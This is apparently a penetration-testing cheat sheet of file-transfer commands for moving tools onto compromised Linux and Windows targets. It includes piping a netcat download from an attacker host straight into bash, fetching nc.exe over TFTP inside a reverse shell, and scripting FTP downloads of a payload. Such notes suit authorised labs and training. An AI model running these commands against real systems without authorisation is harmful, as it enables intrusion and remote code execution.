## File Transfers
#### Find writable directories in Linux
```
find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \;
```
#### To host files in Kali
```
python -m SimpleHTTPServer 80
```
#### To download files
```
wget http://attackingip/file.ext
# or
curl http://attackingip/file.ext > file.ext

```
#### Netcat File Transfer
```
# Setup a listener to receive file
nc -nlvp 55555 > file

# Now send the file
nc iptoreceivefile 55555 < file 
```
#### Alternate Netcat File Transfer to execute automatically in bash
```
# On attacking box
cat LinEnum.sh | nc -lvnp 9001

# On target machine
nc attackingip 9001 | bash
```
#### TFTP UDP Transfer
```
# Create directory to serve files
mkdir /tftp

# Start atftpd daemon and listen on UDP port 69 using /tftp as root
atftpd --daemon --port 69 /tftp

# Copy file to share to host directory
cp /usr/share/windows-binaries/nc.exe /tftp/

# In your reverse/bind shell on the target machine, change 10.11.1.140 to attacking ip
tftp -i 10.11.1.140 GET nc.exe
```
---
#### FTP File Transfer
On attacking machine, setup an ftp server
```
apt-get install pure-ftpd
```

Download and run the following setup file, it will create an ftp user 'bedford'
[setup-ftp](/setup-ftp)

Change user permissions, run file and set password on request
```
chmod 755
./setup-ftp
```

Copy and paste the following code into your Windows target bind/reverse shell
```
echo open 10.11.1.140 21> ftp.txt
echo user bedford>> ftp.txt
echo urpasswd>> ftp.txt
echo bin>> ftp.txt
echo GET evilfile.txt>> ftp.txt
echo bye>> ftp.txt
```
Now in your Windows bind/reverse shell run the ftp.txt file
`ftp -v -n -s:ftp.txt`

---
#### File Transfer using SSH
```
scp filename username@ipaddress
# Then enter password at prompt
```
